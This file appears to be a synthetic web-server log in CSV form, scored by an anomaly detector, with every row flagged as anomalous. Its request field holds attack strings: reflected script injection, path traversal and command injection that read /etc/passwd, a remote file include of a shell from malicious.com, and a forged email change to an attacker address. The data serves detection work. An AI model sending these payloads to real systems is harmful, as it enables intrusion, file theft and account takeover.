ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
8.200.108.146,2025-03-15 12:04:37,POST /change-email?email=attacker@example.com HTTP/1.1,200,4361,1.2429666945122408,False,54,200,True,True
50.172.77.46,2025-03-15 12:04:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1603,-0.8746869259796946,False,60,403,True,True
111.44.166.155,2025-03-15 12:05:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4422,1.2898038485550283,False,51,403,True,True
197.251.16.192,2025-03-15 12:05:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,4107,1.0479398563668632,False,54,200,True,True
194.167.238.179,2025-03-15 12:04:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3461,0.5519267168317687,False,60,403,True,True
91.70.109.46,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1085,-1.2724188242446772,False,60,403,True,True
185.86.168.41,2025-03-15 12:05:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,4403,1.275215226803996,False,54,200,True,True
211.159.49.56,2025-03-15 12:04:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,926,-1.394502553634894,False,59,200,True,True
90.137.43.46,2025-03-15 12:05:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2373,-0.28346383396417957,False,60,403,True,True
14.171.19.78,2025-03-15 12:04:40,POST /change-email?email=attacker@example.com HTTP/1.1,200,680,-1.5833868142008898,False,54,200,True,True
248.161.48.25,2025-03-15 12:05:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4585,1.414958866734936,False,51,403,True,True
48.31.19.191,2025-03-15 12:04:43,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,739,-1.5380853045529477,False,59,200,True,True
36.66.27.98,2025-03-15 12:05:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4544,1.3834781566406034,False,51,403,True,True
213.174.212.5,2025-03-15 12:04:49,POST /change-email?email=attacker@example.com HTTP/1.1,200,4507,1.3550687353359618,False,54,200,True,True
74.93.172.169,2025-03-15 12:04:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4658,1.4710098871467965,False,60,403,True,True
1.164.147.242,2025-03-15 12:04:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,858,-1.4467144630596407,False,54,200,True,True
133.115.70.137,2025-03-15 12:05:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2414,-0.251983123869847,False,60,403,True,True
126.92.163.106,2025-03-15 12:05:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,774,-1.5112115276431515,False,47,403,True,True
199.233.100.89,2025-03-15 12:05:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2110,-0.48540107188636195,False,60,403,True,True
162.198.199.29,2025-03-15 12:04:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4634,1.4525821544086506,False,51,403,True,True
196.225.119.59,2025-03-15 12:05:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,4534,1.3757999346663758,False,54,200,True,True
105.235.95.225,2025-03-15 12:05:23,GET /admin HTTP/1.1,403,698,-1.5695660146472803,False,19,403,True,True
78.159.225.252,2025-03-15 12:05:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4910,1.6645010808973286,False,60,403,True,True
6.25.237.237,2025-03-15 12:04:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4804,1.5831119279705175,False,51,403,True,True
92.160.210.103,2025-03-15 12:05:25,GET /execute?cmd=whoami HTTP/1.1,403,517,-1.7085418323807975,False,32,403,True,True
252.215.82.217,2025-03-15 12:04:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3686,0.7246867112518868,False,60,403,True,True
111.23.53.188,2025-03-15 12:05:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4457,1.3166776254648245,False,60,403,True,True
10.40.99.50,2025-03-15 12:05:31,POST /change-email?email=attacker@example.com HTTP/1.1,200,4696,1.5001871306488608,False,54,200,True,True
215.230.217.82,2025-03-15 12:04:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1083,-1.2739544686395228,False,51,403,True,True
165.45.77.226,2025-03-15 12:04:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,4535,1.3765677568637986,False,54,200,True,True
33.92.207.197,2025-03-15 12:05:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3316,0.4405924982054705,False,60,403,True,True
219.200.52.18,2025-03-15 12:04:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,517,-1.7085418323807975,False,54,200,True,True
43.241.100.93,2025-03-15 12:05:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1287,-1.1173187403652824,False,60,403,True,True
48.100.50.202,2025-03-15 12:04:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1204,-1.1810479827513705,False,60,403,True,True
39.131.173.155,2025-03-15 12:05:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1916,-0.6343585781863749,False,60,403,True,True
25.57.105.138,2025-03-15 12:04:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,4278,1.1792374521261528,False,54,200,True,True
85.118.238.229,2025-03-15 12:05:17,POST /change-email?email=attacker@example.com HTTP/1.1,200,4175,1.1001517657916098,False,54,200,True,True
186.114.176.122,2025-03-15 12:05:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4373,1.2521805608813137,False,60,403,True,True
163.230.169.156,2025-03-15 12:04:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1297,-1.109640518391055,False,60,403,True,True
107.116.42.170,2025-03-15 12:05:07,POST /change-email?email=attacker@example.com HTTP/1.1,200,4813,1.5900223277473222,False,54,200,True,True
61.216.88.194,2025-03-15 12:05:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,630,-1.621777924072027,False,54,200,True,True
161.239.207.135,2025-03-15 12:05:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4820,1.5953970831292814,False,59,200,True,True
165.236.43.78,2025-03-15 12:05:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4530,1.372728645876685,False,47,403,True,True
12.212.83.84,2025-03-15 12:05:19,POST /change-email?email=attacker@example.com HTTP/1.1,200,4619,1.4410648214473094,False,54,200,True,True
171.70.142.253,2025-03-15 12:05:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4364,1.245270161104509,False,60,403,True,True
221.184.221.174,2025-03-15 12:05:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2366,-0.2888385893461388,False,60,403,True,True
53.34.220.94,2025-03-15 12:04:49,GET /admin HTTP/1.1,403,816,-1.478962995351396,False,19,403,True,True
225.235.87.194,2025-03-15 12:05:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2077,-0.5107392044013126,False,60,403,True,True
115.64.154.183,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1049,-1.3000604233518962,False,60,403,True,True
36.73.117.139,2025-03-15 12:05:32,GET /admin HTTP/1.1,403,4668,1.478688109121024,False,19,403,True,True
24.123.213.89,2025-03-15 12:05:33,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,624,-1.6263848572565636,False,51,403,True,True
224.43.119.2,2025-03-15 12:05:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,631,-1.6210101018746044,False,60,403,True,True
10.211.181.73,2025-03-15 12:05:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4157,1.0863309662380005,False,60,403,True,True
82.6.150.176,2025-03-15 12:04:45,GET /admin HTTP/1.1,403,4706,1.5078653526230883,False,19,403,True,True
160.80.141.19,2025-03-15 12:04:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3636,0.6862956013807494,False,60,403,True,True
234.24.228.79,2025-03-15 12:05:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2261,-0.3694599200755272,False,60,403,True,True
43.180.166.4,2025-03-15 12:05:34,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4989,1.7251590344937255,False,47,403,True,True
73.186.111.162,2025-03-15 12:05:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1369,-1.0543573201766172,False,60,403,True,True
220.69.108.237,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,794,-1.4958550836946967,False,60,403,True,True
236.167.234.57,2025-03-15 12:05:06,POST /change-email?email=attacker@example.com HTTP/1.1,200,3966,0.9396769265302558,False,54,200,True,True
194.33.149.220,2025-03-15 12:05:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,758,-1.5234966828019154,False,59,200,True,True
149.130.133.197,2025-03-15 12:05:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,4812,1.5892545055498994,False,54,200,True,True
53.163.115.238,2025-03-15 12:05:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1801,-0.7226581308899906,False,60,403,True,True
97.229.190.152,2025-03-15 12:04:46,GET /admin HTTP/1.1,403,4945,1.6913748578071248,False,19,403,True,True
98.125.101.33,2025-03-15 12:04:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1294,-1.1119439849833233,False,60,403,True,True
41.186.127.6,2025-03-15 12:04:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1758,-0.7556744853791688,False,60,403,True,True
173.212.75.217,2025-03-15 12:05:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4449,1.3105350478854425,False,59,200,True,True
214.208.151.228,2025-03-15 12:05:01,GET /admin HTTP/1.1,403,797,-1.4935516171024283,False,19,403,True,True
